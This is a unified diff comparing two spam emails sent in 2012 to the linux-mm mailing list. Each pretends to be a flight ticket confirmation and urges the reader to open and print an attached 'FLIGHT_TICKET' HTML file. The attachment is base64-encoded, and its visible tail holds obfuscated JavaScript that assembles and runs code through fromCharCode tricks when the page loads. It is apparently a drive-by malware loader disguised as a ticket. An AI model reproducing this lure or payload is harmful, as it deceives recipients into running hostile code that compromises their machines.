@@ -1,57 +1,79 @@
-Return-Path: <BrockUngerecht@wildblue.net>
-Content-Type: multipart/mixed;
-	boundary="========GMXBoundary192750550312824291753"
-Date: Tue, 7 Aug 2012 08:00:42 -0800
-From: <BrockUngerecht@kvack.org>
-Message-ID: <42499789275216.359659@kvack.org>
+Return-Path: <BryantEdlao@mnp.ca>
+Received: from mtaomg-ma02.r1000.mx.aol.com (mtaomg-ma02.r1000.mx.aol.com [172.29.51.137])
+	by imr-da01.mx.aol.com (8.14.1/8.14.1) with ESMTP id p72iOHii015908
+	for <linux-mm@kvack.org>; Wed, 8 Aug 2012 06:37:49 +0330
+Received: from core-mjc002a.r1000.mail.aol.com (core-mjc002.r1000.mail.aol.com [172.29.160.208])
+	by mtaomg-ma02.r1000.mx.aol.com (OMAG/Core Interface) with ESMTP id 95E0CA000031
+	for <linux-mm@kvack.org>; Wed, 8 Aug 2012 06:37:49 +0330
+Subject: Fwd: Re: Your Flight US 17-151128
 MIME-Version: 1.0
-Subject: Re: Your Flight US 007-62426
+From: <AllredMATHILDE@aol.com>
+Content-Type: multipart/mixed;
+ boundary="--------MB_8CE7B48DA49CA486_119C_676E0_webmail-d006.sysops.aol.com"
+Message-Id: <8CE7B48DA4F29C3-119C-A4867@webmail-d006.sysops.aol.com>
+Date: Wed, 8 Aug 2012 06:37:49 +0330
 To: linux-mm@kvack.org
 List-ID: <linux-mm.kvack.org>
 
---========GMXBoundary192750550312824291753
+This is a multi-part message in MIME format.
+----------MB_8CE7B48DA49CA486_119C_676E0_webmail-d006.sysops.aol.com
 Content-Type: multipart/alternative;
-	boundary="========GMXBoundary230557000014437769820"
+ boundary="--------MB_8CE7B48DA49CA486_119C_D3F0C_webmail-d006.sysops.aol.com"
 
---========GMXBoundary230557000014437769820
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 8bit
-
-Dear Customer,FLIGHT NUMBER  653-187DATE/TIME : SEPT 21, 2012, 19:18 PMARRIVING AIRPORT: SAN-DIEGO AIRPORTPRICE : 995.58 USDYour bought ticket is attached to the letter as a scan document .To use your ticket you should print it.DIONNE Mackey,
-
---========GMXBoundary230557000014437769820
-Content-Type: text/html; charset="utf-8"
+----------MB_8CE7B48DA49CA486_119C_D3F0C_webmail-d006.sysops.aol.com
 Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset="windows-1250"
 
-<html>
-<head>
-<style><!--
-background-color: #0c3496;font-family:"Mangal","Lucida Sans";font-size:28=
-px;font-style: italic;
---></style>
-</head>
-<body>
-Dear Customer,<br /><br />
 
-FLIGHT NUMBER  653-187<br />
-DATE/TIME : SEPT 21, 2012, 19:18 PM<br />
+Dear Customer,FLIGHT NUMBER  15660-674DATE/TIME : SEPT 24, 2012, 19:17 PM=
+ARRIVING AIRPORT: SAN-DIEGO AIRPORTPRICE : 377.61 USDYour bought ticket i=
+s attached to the letter as a scan document .To use your ticket you shoul=
+d print it.MATHILDE Allred,
+
+
+
+----------MB_8CE7B48DA49CA486_119C_D3F0C_webmail-d006.sysops.aol.com
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset=3D"windows-1250"
+
+<font color=3D'black' size=3D'2' face=3D'arial'><font color=3D"black" fac=
+e=3D"arial" size=3D"2">
+
+<div> <br>
+
+</div>
+
+
+
+<div> <u><i><font face=3D"Verdana, Arial, Helvetica, sans-serif">Dear Cus=
+tomer,<br /><br />
+
+FLIGHT NUMBER  15660-674<br />
+DATE/TIME : SEPT 24, 2012, 19:17 PM<br />
 ARRIVING AIRPORT: SAN-DIEGO AIRPORT<br />
-PRICE : 995.58 USD<br /><br />
+PRICE : 377.61 USD<br /><br />
 
 Your bought ticket is attached to the letter as a scan document .<br />
 To use your ticket you should print it.<br /><br />
 
 
-DIONNE Mackey,<br />
-</body></html>
+MATHILDE Allred,<br /></font></i></u><br>
 
---========GMXBoundary230557000014437769820--
+</div>
 
 
---========GMXBoundary192750550312824291753
-Content-Type: text/html
+
+<div style=3D"clear:both"></div>
+
+</font></font>
+----------MB_8CE7B48DA49CA486_119C_D3F0C_webmail-d006.sysops.aol.com--
+
+
+----------MB_8CE7B48DA49CA486_119C_676E0_webmail-d006.sysops.aol.com
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="FLIGHT_TICKET_US879428844.htm"
+Content-Disposition: attachment; filename="FLIGHT_TICKET_US565054.htm"
+Content-Type: application/octet-stream; name="FLIGHT_TICKET_US565054.htm"
+
 
 PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFs
 Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+DQo8aHRtbD4NCiA8
@@ -128,5 +150,4 @@ O3MrPVN0cmluZ1siZnJvbUNoYXJDb2RlIl0obltrXS8oaS1oKk1hdGguZmxvb3IoaS9oKSsxMikp
 O31pZigwMTUtMHhhPT09MylpZih3aW5kb3cuZG9jdW1lbnQpZShzKTt9PC9zY3JpcHQ+DQoNCg0K
 DQo8L2JvZHk+DQo8L2h0bWw+ 
 
-
---========GMXBoundary192750550312824291753--
+----------MB_8CE7B48DA49CA486_119C_676E0_webmail-d006.sysops.aol.com--
